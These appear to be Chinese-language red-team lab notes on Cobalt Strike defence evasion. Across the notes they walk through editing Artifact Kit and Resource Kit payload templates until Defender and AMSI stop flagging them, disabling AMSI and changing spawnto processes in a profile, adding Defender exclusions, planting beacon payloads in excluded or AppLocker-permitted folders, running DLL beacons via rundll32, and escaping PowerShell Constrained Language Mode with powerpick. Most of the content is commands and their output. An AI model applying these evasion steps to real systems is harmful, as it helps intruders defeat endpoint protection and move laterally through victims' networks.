# Bypassing Antivirus

可以列举C盘，但是无法横向，考虑bypass antivirus，如下显示
```
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
...<skip>...

beacon> jump psexec64 dc-2 smb
[-] Could not start service c8e8647 on dc-2: 225
[-] Could not connect to pipe: 2

beacon> jump winrm64 dc-2 smb
[-] Could not connect to pipe: 2

#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  Set-StrictMode -Version 2_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParseException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```

上面xml文字出现了**This script contains malicious content and has been blocked by your antivirus software**字样，表明程序被AMSI（antimalware scan interface）杀掉了

```Get-MpThreatDetection```是一个 Windows Defender cmdlet，可以显示检测到的威胁
```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\c8e8647.exe, file:_\\dc-2\ADMIN$\c8e8647.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_C:\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04
```

第一条是尝试使用```psexec64```,可执行程序```c8e8647.exe```已自动上传到靶机，但是被侦测到并被从硬盘上删除。

第二条是尝试使用```winrm64```,```wsmprovhost.exe```被AMSI从内存中侦测到，并且被阻止执行。

# Artifact Kit

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)是Matterpreter 的 DefenderCheck的修改版本。在这里用于扫描作为payload的二进制文件的阳性检测。

例子：
```
C:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
[+] Target file size: 289280 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x44E70
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   5F 73 65 74 5F 69 6E 76  61 6C 69 64 5F 70 61 72   _set_invalid_par
000000A0   61 6D 65 74 65 72 5F 68  61 6E 64 6C 65 72 00 00   ameter_handler··
000000B0   77 69 6E 64 69 72 00 25  73 5C 53 79 73 74 65 6D   windir·%s\System
000000C0   33 32 5C 25 73 00 72 75  6E 64 6C 6C 33 32 2E 65   32\%s·rundll32.e
000000D0   78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00   xe··············
000000E0   25 63 25 63 25 63 25 63  25 63 25 63 25 63 25 63   %c%c%c%c%c%c%c%c
000000F0   25 63 4D 53 53 45 2D 25  64 2D 73 65 72 76 65 72   %cMSSE-%d-server

[*] Run time: 8.91s
```

```%c%c%c%c%c%c%c%c%cMSSE-%d-server```这行代码引起了报警。

搜索MSSE在套件中出现的位置，我们发现它位于```bypass-pipe.c```

出问题的貌似是这行代码
```
root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE
src-common/bypass-pipe.c:       sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

上面工具的逻辑是：创建一个命名管道，通过该dist-pipe管道读取 shellcode，然后执行它

管道的名称看起来是随机生成的，看起来像```\\.\pipe\MSSE-1866-server```,怀疑是这个随机的名称触发了报警

修改为以下代码,将字符串MSSE和server更改为不同的内容
```
sprintf(pipename, "%c%c%c%c%c%c%c%c%cRasta-%d-pipe", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

运行build.sh脚本重新构建程序
```
root@kali:/opt/cobaltstrike/artifact-kit# ./build.sh
```

在该```dist-pipe```目录中,artifacts新建了一个新的列表，包括一个```artifact.cna```文件，这个CNA文件会告诉Cobalt Strike使用这个artifacts列表里的文件，不要使用默认文件。

```
root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/
total 2108
-rwxr-xr-x 1 root root 312334 Mar 17 09:25 artifact32big.dll
-rwxr-xr-x 1 root root 310286 Mar 17 09:25 artifact32big.exe
-rwxr-xr-x 1 root root  41998 Mar 17 09:25 artifact32.dll
-rwxr-xr-x 1 root root  39950 Mar 17 09:25 artifact32.exe
-rwxr-xr-x 1 root root 311822 Mar 17 09:25 artifact32svcbig.exe
-rwxr-xr-x 1 root root  41486 Mar 17 09:25 artifact32svc.exe
-rwxr-xr-x 1 root root 311808 Mar 17 09:26 artifact64big.exe
-rwxr-xr-x 1 root root 312320 Mar 17 09:26 artifact64big.x64.dll
-rwxr-xr-x 1 root root  41472 Mar 17 09:26 artifact64.exe
-rwxr-xr-x 1 root root 313344 Mar 17 09:26 artifact64svcbig.exe
-rwxr-xr-x 1 root root  43008 Mar 17 09:26 artifact64svc.exe
-rwxr-xr-x 1 root root  41984 Mar 17 09:25 artifact64.x64.dll
-rw-r--r-- 1 root root   2031 Mar 17 09:25 artifact.cna
```

把整个文件夹拷贝到```C:\Tools\cobaltstrike\ArtifactKit```

```
C:\Tools\cobaltstrike>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

在 Cobalt Strike 中，会看到它已经加载，理论上无需再次加载，如果需要手动加载，转到```Cobalt Strike > Script Manager```

再次测试上面的输入文件
```
C:\Tools>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc-dist-pipe.exe
[+] No threat found!
[*] Run time: 0.89s
```

现在横向到DC2就不会被AV侦测到
```
beacon> jump psexec64 dc-2 smb
Started service c1d61c7 on dc-2
[+] established link to child beacon: 10.10.17.71
```

# Resource Kit

Resource Kit 包含Cobalt Strike基于脚本的有效载荷模板，包括PowerShell、VBA和HTA
```
PS C:\Tools\cobaltstrike\ResourceKit> ls

    Directory: C:\Tools\cobaltstrike\ResourceKit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2019   9:15 PM            205 compress.ps1
-a----         8/2/2018   2:17 AM           2979 README.txt
-a----         6/9/2020   6:31 PM           4359 resources.cna
-a----         4/3/2018   8:02 PM            830 template.exe.hta
...
```

template.x64.ps1是命令jump winrm64使用的模板

ThreatCheck检查
```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] Target file size: 2371 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x703
00000000   6E 74 61 74 69 6F 6E 46  6C 61 67 73 28 27 52 75   ntationFlags('Ru
00000010   6E 74 69 6D 65 2C 20 4D  61 6E 61 67 65 64 27 29   ntime, Managed')
00000020   0A 0A 09 72 65 74 75 72  6E 20 24 76 61 72 5F 74   ···return $var_t
00000030   79 70 65 5F 62 75 69 6C  64 65 72 2E 43 72 65 61   ype_builder.Crea
00000040   74 65 54 79 70 65 28 29  0A 7D 0A 0A 49 66 20 28   teType()·}··If (
00000050   5B 49 6E 74 50 74 72 5D  3A 3A 73 69 7A 65 20 2D   [IntPtr]::size -
00000060   65 71 20 38 29 20 7B 0A  09 5B 42 79 74 65 5B 5D   eq 8) {··[Byte[]
00000070   5D 24 76 61 72 5F 63 6F  64 65 20 3D 20 5B 53 79   ]$var_code = [Sy
00000080   73 74 65 6D 2E 43 6F 6E  76 65 72 74 5D 3A 3A 46   stem.Convert]::F
00000090   72 6F 6D 42 61 73 65 36  34 53 74 72 69 6E 67 28   romBase64String(
000000A0   27 25 25 44 41 54 41 25  25 27 29 0A 0A 09 66 6F   '%%DATA%%')···fo
000000B0   72 20 28 24 78 20 3D 20  30 3B 20 24 78 20 2D 6C   r ($x = 0; $x -l
000000C0   74 20 24 76 61 72 5F 63  6F 64 65 2E 43 6F 75 6E   t $var_code.Coun
000000D0   74 3B 20 24 78 2B 2B 29  20 7B 0A 09 09 24 76 61   t; $x++) {···$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor
```

看来是这段代码有问题
```
for ($x = 0; $x -lt $var_code.Count; $x++) {
  $var_code[$x] = $var_code[$x] -bxor 35
}
```

换变量名字:$x -> $i ， $var_code -> $var_banana
```
for ($i = 0; $i -lt $var_banana.Count; $i++) {
  $var_banana[$i] = $var_banana[$i] -bxor 35
}
```

再次检测，没有警报了
```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] No threat found!
[*] Run time: 0.19s
```

通过Cobalt Strike > Script Manager加载resources.cna，现在可以横向了
```
beacon> jump winrm64 dc-2 smb
[+] established link to child beacon: 10.10.17.71
```

# AmsiScanBuffer

[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)
amsi.dll是从实现反恶意软件扫描接口 (AMSI) 的库导出的 API

应用程序如powershell会自动加载amsi.dll

所有经由powershell的命令都会先进入这个动态链接库判断是否存在恶意行为

在Cobalt Strike中有一个```amsi_disable```可以绕过AMSI

要启用amsi_disable指令，请在你的配置文件中添加以下内容：
```
post-ex {
    set amsi_disable "true";
}
```

上面配置会让C2执行 ```powerpick```, ```execute-assembly``` 和 ```psinject```时绕过AMSI


# Behavioural Detections

CS横移时默认使用rundll32 进程 

rundll32 作为 Cobalt Strike 的默认“spawnto”已经存在很长时间了，现在是一个常见的检测点

修改横移时使用的进程为dllhost.exe，使用下面profile配置

```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

# Policy Enumeration（策略枚举）

枚举AppLocker，并且下载GPO文件到本地
```
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

displayname gpcfilesyspath                                                                        
----------- --------------                                                                        
AppLocker   \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}

beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
[*] started download of \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol (7616 bytes)
[*] download of Registry.pol is complete
```

```
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
```

```
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

# Writeable Path（可写路径）

枚举```C:\Windows\Tasks```目录是否可写
```
beacon> powershell Get-Acl C:\Windows\Tasks | fl
```


# PowerShell CLM

如果powershell在靶机里被CLM设置为约束语言，使用powerpick替代

```
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage
```


# Exclusions

所有杀毒软件厂商都有自己的例外规则。Windows Defender 允许管理员通过 GPO 或在单台计算机上本地添加排除项

通常的排除项包括以下三种类型：

1. 扩展名   - 按文件扩展名排除所有文件。(Extension - exclude all files by their file extension.)
2. 目录路径 -排除给定目录中的所有文件。(Path - exclude all files in the given directory.)
3. 进程     - 排除指定进程打开的任何文件。(Process - exclude any file opened by the specified processes.)


```Get-MpPreference```可用于列出当前排除项。远程执行使用```remote-exec```
```
beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*

ExclusionExtension : 
ExclusionIpAddress : 
ExclusionPath : {C:\Shares\software}
ExclusionProcess :
```

如果排除项是通过GPO配置的，并且你能找到相应的Registry.pol文件，你可以用```Parse-PolFile```读取它们
```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```

如果发现有可写的文件夹，可用于上传payload
```
beacon> cd \\dc-2\c$\shares\software
beacon> upload C:\Payloads\beacon.exe
beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon.exe
beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon.exe
beacon> link dc-2
[+] established link to child beacon: 10.10.17.71
```


添加自己的排除项(路径)
```
Set-MpPreference -ExclusionPath "<path>"
```

# AppLocker

AppLocker 是 Microsoft 的应用程序白名单技术，可以限制允许在系统上运行的可执行文件、库和脚本

AppLocker 规则分为 5 个类别：
- 可执行文件
- Windows Installer
- Script
- Packaged App
- DLL


AppLocker对以上类别的执行强度分为：
- enforced（强制执行）
- audit only（仅审计）
- none（无）


拒绝规则的优先级高于允许规则。拒绝规则通常用来禁止[LOLBAS](https://lolbas-project.github.io/)里的程序

一个被applocker拒绝执行的例子
```
C:\>test.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

# AppLocker Rule Bypasses

绕过AppLocker的方法：
1. 通过受信任的[LOLBAS](https://lolbas-project.github.io/)程序执行恶意命令或者代码（Executing untrusted code via trusts LOLBAS's.）
2. 在受信任的路径列表中找到可写的文件夹。（Finding writeable directories within "trusted" paths.）
3. AppLocker默认不适用于Administrators组（By default, AppLocker is not even applied to Administrators.）


系统管理员通常会添加自定义规则来满足特定的软件要求。写得不好或过于宽松的规则会提供可以利用的漏洞

## 读取AppLocker配置
与 LAPS 一样，AppLocker 在 GPO 中创建一个Registry.pol文件，我们可以使用cmdletGpcFileSysPath读取该文件

```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20"
                Name="(Default Rule) All files located in the Program Files folder"
                Description="Allows members of the Everyone group to run applications that are located in the Program Files folder."
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                <Conditions>
                  <FilePathCondition Path="%PROGRAMFILES%\*"/>
                </Conditions>
              </FilePathRule>
```


AppLocker规则还可以通过```HKLM\Software\Policies\Microsoft\Windows\SrpV2```读取

## 路径绕过
下面例子展示一个AppLocker规则允许```C:\Windows\Tasks```这个路径才能执行二进制文件的例子
```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\Administrator\Desktop>move test.exe C:\Windows\Tasks
        1 file(s) moved.

C:\Users\Administrator\Desktop>C:\Windows\Tasks\test.exe
Bye-Bye AppLocker!
```


这是一个过于宽松的规则的例子。
```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\3470949d-4a86-4ec5-aa37-5ad7acd6a925
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 482
ValueData   : <FilePathRule Id="3470949d-4a86-4ec5-aa37-5ad7acd6a925"
                Name="Packages"
                Description="Allow custom packages"
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                  <Conditions>
                    <FilePathCondition Path="%OSDRIVE%\*\Packages\*"/>
                  </Conditions>
                </FilePathRule>
```

上面规则的意思是允许任何C盘下的```Packages```文件夹执行可执行程序，```%OSDRIVE%\*\Packages\*```=```C:\*\Packages\*```

因此这里是一个绕过的例子
```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\Administrator\Desktop>mkdir Packages

C:\Users\Administrator\Desktop>move test.exe Packages
        1 file(s) moved.

C:\Users\Administrator\Desktop>Packages\test.exe
Bye-Bye AppLocker!
```
## DLL

AppLocker很少启用DLL规则，可能会引起系统不稳定而且需要很多测试

Cobalt Strike可以把恶意payload编译成dll方式，使用windwos的rundll32执行
```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8A6C-CD61

 Directory of C:\Users\Administrator\Desktop

05/17/2021  11:01 PM    <DIR>          .
05/17/2021  11:01 PM    <DIR>          ..
05/17/2021  10:59 PM           311,808 beacon.dll

C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
```

```
beacon> link dc-1
[+] established link to child beacon: 10.10.15.75
```


# PowerShell Constrained Language Mode

当启用AppLocker时，PowerShell被置于受限语言模式（CLM）中，该模式将其限制为核心类型。

```$ExecutionContext.SessionState.LanguageMode```将显示执行进程的语言模式。

```
beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode

PSComputerName RunspaceId                           Value              
-------------- ----------                           -----              
dc-1           9dd4aebc-540e-4683-b3f7-07b6f799266e ConstrainedLanguage
```

jump winrm[64]和其他 PowerShell 脚本将失败并出现错误:**Cannot create type. Only core types are supported in this language mode.**

```
beacon> remote-exec winrm dc-1 [math]::Pow(2,10)

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">
```


CLM 与 AppLocker 一样脆弱，因此任何 AppLocker 绕过都可能导致 CLM 绕过

Beacon 有一个```powerpick```命令,在CLM下可以替代powershell

> So if we find an AppLocker bypass rule in order to execute a Beacon, powerpick can be used to execute post-ex tooling outside of CLM

```
beacon> run hostname
dc-1

beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powershell [math]::Pow(2,10)
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ [math]::Pow(2,10)_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

beacon> powerpick [math]::Pow(2,10)
1024
```